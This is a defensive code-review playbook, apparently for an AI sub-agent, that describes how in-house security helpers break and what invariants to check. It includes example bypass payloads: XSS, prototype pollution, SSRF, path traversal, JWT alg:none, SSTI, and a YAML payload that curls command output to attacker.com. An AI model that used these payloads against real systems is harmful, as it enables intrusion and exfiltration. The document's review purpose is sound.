# Helper Inspection Playbook

This playbook is consumed by a `helper-reviewer` sub-agent when the scanner emits MANUAL-REVIEW findings for helper/utility files. Load this file plus the flagged source, then judge whether each helper's advertised safety property actually holds.

**Required output per finding — four fields, no exceptions:**
- `file:line` — exact location of the broken code
- `broken-invariant` — the safety property that fails (one sentence)
- `example-bypass-input` — a concrete input string or value that defeats the broken implementation
- `confidence` — `high`, `med`, or `low`

---

## 1. Sanitizer Wrappers

**What it looks like:** functions named `sanitize`, `escape`, `clean`, `stripTags`, `purify`, `htmlSafe`. Imported from an in-house `utils/sanitize.js`, `lib/html.ts`, or similar. Often wraps a regex or a small string replacement chain.

**How it breaks in the wild:**
- Nested-tag stripping: `/gsub(/<\/?script>/i, '')` is bypassed by `<scri<script>pt>alert(1)</scri</script>pt>` — strip once, get `<script>alert(1)</script>`.
- Context-blind encoding: escaping `<`, `>`, `"` for HTML text but the output lands in a JS string literal or an HTML attribute without quotes — `&lt;` is fine in text, lethal in `onmouseover=&lt;...&gt;`.
- Blocklist instead of allowlist: stripping `<script>` and `<iframe>` but not `<object>`, `<embed>`, `<svg onload=...>`, or `<math>` polyglots.

**Invariants to check:**
- Uses an allowlist of tags+attributes, not a blocklist.
- Encodes to the correct context (HTML text vs. attribute vs. JS vs. CSS vs. URL).
- Applies encode/strip in a single pass that is idempotent — a second pass produces the same output.
- Does not re-decode entities before stripping (double-decode bypass).
- Does not trust `innerHTML` assignment as a "parse then serialize" sanitizer unless it's DOMPurify.

**Correct reference:** `DOMPurify.sanitize(input, { USE_PROFILES: { html: true } })` with default config.

**Example bypass input:** `<scri<script>pt>alert(document.domain)</scri</script>pt>`

---

## 2. Crypto Helpers

**What it looks like:** functions named `hash`, `hashPassword`, `encrypt`, `decrypt`, `generateToken`, `compare`, `signToken`. Imported from `lib/crypto.js`, `utils/auth.ts`, etc.

**How it breaks in the wild:**
- `Math.random()` seeded tokens: `generateToken = () => Math.random().toString(36).slice(2)` — predictable, ~52 bits of alphabet from a 32-bit seed.
- MD5 or SHA-1 for password storage: `crypto.createHash('md5').update(password).digest('hex')` — rainbow-table trivial.
- Non-timing-safe compare: `storedHash === incomingHash` leaks length and prefix via timing side-channel.
- ECB mode or hardcoded IV: `createCipheriv('aes-256-cbc', key, '0000000000000000')` — identical plaintext blocks produce identical ciphertext; IV reuse destroys IND-CPA security.

**Invariants to check:**
- Tokens use `crypto.randomBytes(n)` (Node) or `secrets.token_bytes(n)` (Python), minimum 16 bytes.
- Passwords use bcrypt/argon2/scrypt with work factor ≥ minimum current recommendation.
- Equality checks use `crypto.timingSafeEqual` (Node) or `hmac.compare_digest` (Python).
- Symmetric encryption uses GCM or CBC with a fresh random IV per operation; IV is stored alongside ciphertext.
- No deprecated algorithms: MD5, SHA1, DES, 3DES, RC4.

**Correct reference:** `bcrypt.hash(password, 12)` / `crypto.randomBytes(32).toString('hex')` for tokens.

**Example bypass input:** Brute-force token space — `Math.random()` in V8 is a 64-bit xorshift128+; state is recoverable from two consecutive outputs.

---

## 3. Deep-Merge / Object-Assign

**What it looks like:** functions named `merge`, `deepMerge`, `extend`, `assign`, `clone`, `defaults`. Accepts two plain objects, iterates keys recursively.

**How it breaks in the wild:**
- Direct key iteration without guard: `for (const key of Object.keys(src)) target[key] = src[key]` — if `src` is `{"__proto__": {"isAdmin": true}}`, `{}.__proto__` is modified globally.
- `constructor.prototype` path: `{"constructor": {"prototype": {"isAdmin": true}}}` pollutes via the constructor chain.
- MikroORM `Utils.merge` pre-2021 allowed pollution through recursive merge of user-supplied documents.

**Invariants to check:**
- Every key assignment guards against `key === '__proto__'`, `key === 'constructor'`, and `key === 'prototype'`.
- Uses `Object.create(null)` or `Object.hasOwn` rather than `hasOwnProperty` (which can itself be overwritten).
- Does not call `JSON.parse(JSON.stringify(src))` as the only guard — that serialization round-trip does NOT strip `__proto__` in all JS runtimes.
- Input from untrusted sources (HTTP body, query params, uploaded JSON) is never passed directly to merge without schema validation first.

**Correct reference:** `structuredClone()` (V8 ≥ 98) or lodash `_.merge` with prototype pollution patch applied.

**Example bypass input:** `{"__proto__": {"admin": true}}` — after `merge({}, payload)`, `({}).admin === true`.

---

## 4. URL / Fetch Helpers

**What it looks like:** functions named `fetchUrl`, `downloadImage`, `proxyRequest`, `loadRemote`, `httpGet`. Accepts a URL string, often from user input or a stored record.

**How it breaks in the wild:**
- No allowlist: any URL is followed, including `http://169.254.169.254/latest/meta-data/` on AWS EC2.
- Localhost filter bypassed: `url.hostname === 'localhost'` passes but `127.1`, `0x7f000001`, `[::1]`, `[::]`, `0177.0.0.1`, and DNS names resolving to 127.x are not blocked.
- DNS rebinding: URL is validated before the request, but between validation and fetch the DNS record changes to an internal IP.
- Auto-redirect: `followRedirects: true` (default in many libs) with no re-validation of the redirect target — an allowlisted URL 301s to `http://internal-service/`.

**Invariants to check:**
- Allowlist of approved hostnames/domains, not a blocklist.
- Resolved IP is checked after DNS resolution, not just the hostname string — blocks RFC 1918, loopback, link-local (169.254.x.x), and IPv6 equivalents.
- Redirects are either disabled or the redirect target is re-validated against the allowlist.
- Scheme is restricted to `https://` (or explicitly `http://` if needed) — no `file://`, `ftp://`, `gopher://`.
- Timeout is set; unbounded requests enable slow-loris style resource exhaustion.

**Correct reference:** `ssrf-filter` (npm) or `ssrfcheck` (Python) as a pre-request guard.

**Example bypass input:** `http://169.254.169.254/latest/meta-data/iam/security-credentials/` or `http://127.1/admin` if only `localhost` is blocked.

---

## 5. Deserialization Helpers

**What it looks like:** functions named `parseJson`, `parseYaml`, `load`, `loads`, `deserialize`, `fromBytes`. Accepts raw strings or byte buffers from network/file input.

**How it breaks in the wild:**
- `yaml.load(input)` in PyYAML executes arbitrary Python via `!!python/object/apply:os.system ["id"]` — must be `yaml.safe_load`.
- `pickle.loads(data)` on untrusted bytes executes arbitrary code during deserialization — there is no safe pickle of untrusted data.
- `JSON.parse` wrapper that then evaluates keys or values: `eval(JSON.parse(input).script)` — the JSON is fine, the eval is not.

**Invariants to check:**
- YAML: always `safe_load` / `YAML.safeLoad` / `SafeYaml::load` — never the bare `load`.
- Python: no `pickle`, `marshal`, or `shelve` on untrusted input; use `json`, `msgpack` with schema.
- Java: JAXB/XStream/Jackson require explicit `deny-all` deserialization filter; default is unsafe.
- No `eval`, `exec`, or `Function()` called on any parsed string value regardless of JSON envelope.
- Schema validation (e.g., JSON Schema, Pydantic, Zod) applied before data is used downstream.

**Correct reference:** `yaml.safe_load(stream)`, `json.loads(s)` with Pydantic model validation.

**Example bypass input (YAML):** `!!python/object/apply:os.system ["curl http://attacker.com/$(id)"]`

---

## 6. File Path Helpers

**What it looks like:** functions named `readUserFile`, `joinPath`, `resolvePath`, `getFilePath`, `serveFile`. Accepts user-controlled file names and joins them to a base directory.

**How it breaks in the wild:**
- `path.join(base, userInput)` does not contain: `path.join('/uploads', '../etc/passwd')` → `/etc/passwd`.
- Normalize then join: `path.join(base, path.normalize(userInput))` still fails — `path.normalize('../../etc/passwd')` → `../../etc/passwd`, then joined escapes base.
- Null byte injection (older runtimes): `filename + "\x00.jpg"` causes C-level file open to stop at null, ignoring the `.jpg` extension check.

**Invariants to check:**
- Resolve the full path: `resolved = path.resolve(base, userInput)`.
- Verify containment: `path.relative(base, resolved)` must not start with `..` and must not equal an absolute path.
- Or: `resolved.startsWith(base + path.sep)` — but base must itself be normalized/resolved first.
- Reject null bytes in filename before any path operation.
- Do not rely on extension checks alone as a containment strategy.

**Correct reference:** `const resolved = path.resolve(base, name); if (!resolved.startsWith(path.resolve(base) + '/')) throw new Error('traversal');`

**Example bypass input:** `../../../etc/passwd` or on Windows `..\..\windows\system32\drivers\etc\hosts`.

---

## 7. Auth Middleware

**What it looks like:** functions/middleware named `requireAuth`, `verifyJWT`, `checkPermission`, `authenticate`, `authorize`. Placed before route handlers; often imported from `middleware/auth.js`.

**How it breaks in the wild:**
- Login-only IDOR: middleware checks `req.user != null` but not `req.user.id === resource.ownerId` — any logged-in user accesses any resource.
- `jwt.verify(token, secret, { algorithms: ['none'] })` — or the algorithms option is omitted entirely in some libraries, which then accept the `alg: none` header.
- Key confusion: RS256 public key passed as the HMAC secret in HS256 verification — attacker signs a token with the public key using HS256; server verifies it as valid.

**Invariants to check:**
- `algorithms` option is explicitly set to an allowlist that excludes `'none'`.
- After verifying the JWT, ownership check confirms `payload.sub` or `payload.userId` matches the requested resource's owner — not just that a valid token exists.
- Public keys and symmetric secrets are never used interchangeably across algorithm families.
- Token expiry (`exp`) is checked; library default behavior should be confirmed — some require `ignoreExpiration: false` explicitly.
- Scope/role claims are validated against a server-side source of truth, not trusted verbatim from the token payload without cross-check.

**Correct reference:** `jwt.verify(token, process.env.JWT_SECRET, { algorithms: ['HS256'] })` followed by a DB ownership lookup.

**Example bypass input:** JWT with header `{"alg":"none"}` and payload `{"sub":"admin"}` — signature omitted or empty string appended.

---

## 8. Templating / Unsafe-HTML Wrappers

**What it looks like:** React components or functions named `SafeHtml`, `RichText`, `renderMarkdown`, `injectHtml`, wrapping `dangerouslySetInnerHTML` or direct `element.innerHTML`. May also be Python/JS server-side template helpers that call `Markup()`, `mark_safe()`, or `env.from_string(userInput).render()`.

**How it breaks in the wild:**
- "Sanitized" wrapper only strips `<script>` tags — `<img src=x onerror=alert(1)>` and `<svg onload=...>` pass through.
- Jinja2/Twig SSTI: `render_template_string(user_input)` where `user_input` is `{{ config }}` or `{{ ''.__class__.__mro__[1].__subclasses__() }}`.
- EJS: `ejs.render(template, data)` where `template` itself is user-controlled — `<%- %>` tag executes arbitrary JS.

**Invariants to check:**
- HTML content passed to `innerHTML` or `dangerouslySetInnerHTML` must be sanitized with DOMPurify (browser) or Bleach/nh3 (Python) — not a custom regex.
- Template strings must never be constructed from user input — user data is interpolation data, not the template itself.
- Server-side template engines: `render_template(filename, **user_data)` is safe; `render_template_string(user_input)` is not.
- `mark_safe()` / `Markup()` must only wrap strings that have already been sanitized or are fully developer-controlled.

**Correct reference:** `DOMPurify.sanitize(html)` before assigning to `dangerouslySetInnerHTML={{ __html: clean }}`.

**Example bypass input (SSTI):** `{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}`

---

## 9. Random / UUID Helpers

**What it looks like:** functions named `generateId`, `createNonce`, `randomToken`, `makeUUID`, `sessionId`. May wrap `Math.random()`, `Date.now()`, or call `uuid.v1()`.

**How it breaks in the wild:**
- `Math.random()` for CSRF tokens or password-reset links — 32-bit seed, not cryptographically random, predictable from observable outputs.
- `Date.now() + Math.random()` concatenated as a string — still ~32 bits of entropy from Math.random, plus a predictable timestamp.
- UUID v1 encodes the MAC address and a monotonic timestamp — given one v1 UUID, adjacent UUIDs are predictable within the millisecond; unsuitable for tokens.

**Invariants to check:**
- Security tokens (CSRF, session, password reset, API keys) use a CSPRNG: `crypto.randomBytes(n)` (Node), `secrets.token_urlsafe(n)` (Python), `SecureRandom` (Java/Kotlin), `CryptographicallySecureRandomNumberGenerator` (Swift).
- Minimum 16 bytes (128 bits) of CSPRNG output for any token that controls authorization.
- UUID v4 (randomly generated) is used where unpredictability matters; UUID v1/v2 is not used for security tokens.
- No seeding of CSPRNG with `Date.now()`, PID, or other low-entropy values.

**Correct reference:** `crypto.randomBytes(32).toString('hex')` (Node) or `secrets.token_hex(32)` (Python).

**Example bypass input:** Reconstruct the xorshift128+ state from two consecutive `Math.random()` outputs; predict all subsequent values.

---

## 10. Redirect Helpers

**What it looks like:** functions named `redirect`, `sendTo`, `returnUrl`, `afterLoginRedirect`, `safeRedirect`. Accepts a URL from a query parameter (e.g., `?next=`, `?returnUrl=`, `?redirect_to=`) and issues an HTTP redirect.

**How it breaks in the wild:**
- Unvalidated open redirect: `res.redirect(req.query.returnUrl)` — attacker crafts `?returnUrl=https://evil.com/phish`.
- Protocol-relative bypass: validator rejects `https://evil.com` but allows `//evil.com/phish` — browsers treat `//` as inheriting the current scheme.
- Parser disagreement: server-side validation uses `urllib.parse` which parses `https:///evil.com` differently than the browser, allowing bypass.

**Invariants to check:**
- Redirect target is compared against an allowlist of trusted domains/paths, not checked for absence of untrusted domains.
- Protocol-relative URLs (`//host/path`) are rejected or resolved to an absolute URL before validation.
- Relative paths (starting with `/`) are preferred over absolute URLs for internal redirects — eliminates host confusion entirely.
- If absolute URLs must be allowed, parse with the same library used for validation and check `hostname` attribute, not a string prefix or regex.
- `javascript:` and `data:` schemes are explicitly rejected.

**Correct reference:** Allow only paths starting with `/` and not `//`; for cross-domain, use a signed token mapping (`?next=dashboard` → server resolves to `/app/dashboard`).

**Example bypass input:** `?returnUrl=//evil.com/steal-cookies` or `?returnUrl=https:///evil.com` depending on parser.

---

## OUTPUT FORMAT

Emit one JSON object per finding on a single line. All four fields are required; omit none.

```json
{"file:line": "src/utils/sanitize.js:42", "broken-invariant": "Blocklist strips <script> but not <svg onload> or event attributes.", "example-bypass-input": "<svg onload=alert(1)>", "confidence": "high"}
```
